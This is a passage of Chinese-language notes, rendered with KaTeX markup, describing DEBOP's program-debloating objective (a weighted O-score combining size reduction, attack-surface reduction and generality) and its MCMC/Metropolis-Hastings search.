encoding="application/x-tex">i_k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8095em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">i</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq> 的使用概率, <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi><mo stretchy="false">(</mo><msub><mi>i</mi><mi>k</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">T(i_k)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">i</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></eq> 是 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>p</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></mrow><annotation encoding="application/x-tex">p&#x27;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9463em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span></eq> 在输入 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>i</mi><mi>k</mi></msub></mrow><annotation encoding="application/x-tex">i_k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8095em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">i</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq> 上的测试结果, <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi><mo stretchy="false">(</mo><msub><mi>i</mi><mi>k</mi></msub><mo stretchy="false">)</mo><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">T(i_k)=1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">i</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span></eq> 表示通过, <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi><mo stretchy="false">(</mo><msub><mi>i</mi><mi>k</mi></msub><mo stretchy="false">)</mo><mo>=</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">T(i_k)=0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">i</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span></eq> 表示失败</li></ul></li><li><p>DEBOP的目标是生成一个简化程序,最大化 sr,ar,g 的加权和</p><ul><li>首先计算简化程序的分数, <eq><span class="katex-error" title="ParseError: KaTeX parse error: Can&#x27;t use function &#x27;$1#x27; in math mode at position 9: r(p,p&#x27;) $̲ , 与sr,ar组合 $" style="color:#cc0000">r(p,p&#x27;) $ , 与sr,ar组合 $</span></eq>r(p,p’)=(1-\alpha) * sr(p,p’) + \alpha * ar(p,p’)<eq><span class="katex-error" title="ParseError: KaTeX parse error: Can&#x27;t use function &#x27;$1#x27; in math mode at position 1: $̲ , 其中 $\alpha" style="color:#cc0000">$ , 其中 $\alpha</span></eq> 表示sr和ar的相关重要性</li><li>随后计算目标函数 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>p</mi><mo separator="true">,</mo><msup><mi>p</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(p,p&#x27;)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0019em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></eq> , 与r,g组合 <section><eqn><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>p</mi><mo separator="true">,</mo><msup><mi>p</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">(</mo><mn>1</mn><mo>−</mo><mi>β</mi><mo stretchy="false">)</mo><mo>∗</mo><mi>r</mi><mo stretchy="false">(</mo><mi>p</mi><mo separator="true">,</mo><msup><mi>p</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo stretchy="false">)</mo><mo>+</mo><mi>β</mi><mo>∗</mo><mi>g</mi><mo stretchy="false">(</mo><mi>p</mi><mo separator="true">,</mo><msup><mi>p</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(p,p&#x27;)=(1-\beta) * r(p,p&#x27;) + \beta * g(p,p&#x27;)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0519em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8019em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05278em;">β</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.0519em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8019em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.05278em;">β</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.0519em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8019em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></span></eqn></section> , 其中 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>β</mi></mrow><annotation encoding="application/x-tex">\beta</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.05278em;">β</span></span></span></span></eq> 表示r和g的相关重要性</li><li>我们将这个值称为 <em>O-score</em> , 现在可以将DEBOP的简化任务形式化为一个优化问题 <section><eqn><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>P</mi><mrow><mi>d</mi><mi>e</mi><mi>b</mi></mrow></msub><mo>=</mo><mi>a</mi><mi>r</mi><mi>g</mi><mi>m</mi><mi>a</mi><msub><mi>x</mi><mrow><msup><mi>p</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo>∈</mo><mi>S</mi><mi>u</mi><mi>b</mi><mo stretchy="false">(</mo><mi>p</mi><mo stretchy="false">)</mo></mrow></msub><mi>O</mi><mo stretchy="false">(</mo><mi>p</mi><mo separator="true">,</mo><msup><mi>p</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">P_{deb} = argmax_{p&#x27;\in Sub(p)} O(p,p&#x27;)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">d</span><span class="mord mathnormal mtight">e</span><span class="mord mathnormal mtight">b</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.1571em;vertical-align:-0.3552em;"></span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">ma</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.5198em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6828em;"><span style="top:-2.786em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mrel mtight">∈</span><span class="mord mathnormal mtight" style="margin-right:0.05764em;">S</span><span class="mord mathnormal mtight">u</span><span class="mord mathnormal mtight">b</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight">p</span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3552em;"><span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8019em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></span></eqn></section> 通过使用不同的权重 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>α</mi></mrow><annotation encoding="application/x-tex">\alpha</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.0037em;">α</span></span></span></span></eq> 和 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>β</mi></mrow><annotation encoding="application/x-tex">\beta</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.05278em;">β</span></span></span></span></eq> , 可以调整DEBOP的行为,以便在sr,ar,g之间进行权衡</li></ul></li><li><p>由于 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi><mi>u</mi><mi>b</mi><mo stretchy="false">(</mo><mi>p</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">Sub(p)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord mathnormal">u</span><span class="mord mathnormal">b</span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mclose">)</span></span></span></span></eq> 的指数规模，通过枚举每个 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>p</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo>∈</mo><mi>S</mi><mi>u</mi><mi>b</mi><mo stretchy="false">(</mo><mi>p</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">p&#x27;∈Sub(p)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9463em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord mathnormal">u</span><span class="mord mathnormal">b</span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mclose">)</span></span></span></span></eq> 并找到具有最高<em>O-score</em>的 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>p</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></mrow><annotation encoding="application/x-tex">p&#x27;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9463em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span></eq> 来解决这个问题是不可行的。因此，Debop利用随机搜索，特别是马尔可夫链蒙特卡洛（MCMC）采样方法，生成一个近似的 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>p</mi><mrow><mi>d</mi><mi>e</mi><mi>b</mi></mrow></msub></mrow><annotation encoding="application/x-tex">p_{deb}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">d</span><span class="mord mathnormal mtight">e</span><span class="mord mathnormal mtight">b</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>。</p></li></ul><h4 id="mcmc-%26-metropolis-hastings-algorithm" tabindex="-1">MCMC &amp; Metropolis-Hastings Algorithm</h4><ul><li><p>MCMC采样用来估计一个分布 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi></mrow><annotation encoding="application/x-tex">d</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">d</span></span></span></span></eq> 的期望值. 为了使用MCMC,我们需要使用 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>p</mi><mo separator="true">,</mo><msup><mi>p</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(p,p&#x27;)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0019em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></eq> 为 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi></mrow><annotation encoding="application/x-tex">d</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">d</span></span></span></span></eq> 定义一个密度函数 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>p</mi><mo separator="true">,</mo><msup><mi>p</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">f(p,p&#x27;)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0019em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></eq> , <section><eqn><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>p</mi><mo separator="true">,</mo><msup><mi>p</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo stretchy="false">)</mo><mo>=</mo><mfrac><mn>1</mn><mi>Z</mi></mfrac><mi>e</mi><mi>x</mi><mi>p</mi><mo stretchy="false">(</mo><mi>k</mi><mo>∗</mo><mi>O</mi><mo stretchy="false">(</mo><mi>p</mi><mo separator="true">,</mo><msup><mi>p</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">f(p,p&#x27;)=\frac{1}{Z}exp(k*O(p,p&#x27;))</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0519em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8019em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.0074em;vertical-align:-0.686em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3214em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">Z</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mord mathnormal">e</span><span class="mord mathnormal">x</span><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.0519em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8019em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mclose">))</span></span></span></span></span></eqn></section> 其中k,Z是常数</p></li><li><p>我们的目标是根据密度值 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi></mrow><annotation encoding="application/x-tex">d</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">d</span></span></span></span></eq> 的比例来抽取足够数量的样本 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi></mrow><annotation encoding="application/x-tex">S</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span></span></span></span></eq> ，并基于 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi></mrow><annotation encoding="application/x-tex">S</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span></span></span></span></eq> 推断 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi></mrow><annotation encoding="application/x-tex">d</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">d</span></span></span></span></eq> 的性质。直观地说，这意味着应该从具有较高密度值（因此具有较高O-score）的 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi></mrow><annotation encoding="application/x-tex">d</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">d</span></span></span></span></eq> 中抽取更多样本，而不是从具有较低密度值的 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi></mrow><annotation encoding="application/x-tex">d</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">d</span></span></span></span></eq> 中抽取样本。在我们的情况下，样本是一个简化的程序 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>p</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo>∈</mo><mi>S</mi><mi>u</mi><mi>b</mi><mo stretchy="false">(</mo><mi>p</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">p&#x27;∈Sub(p)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9463em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" 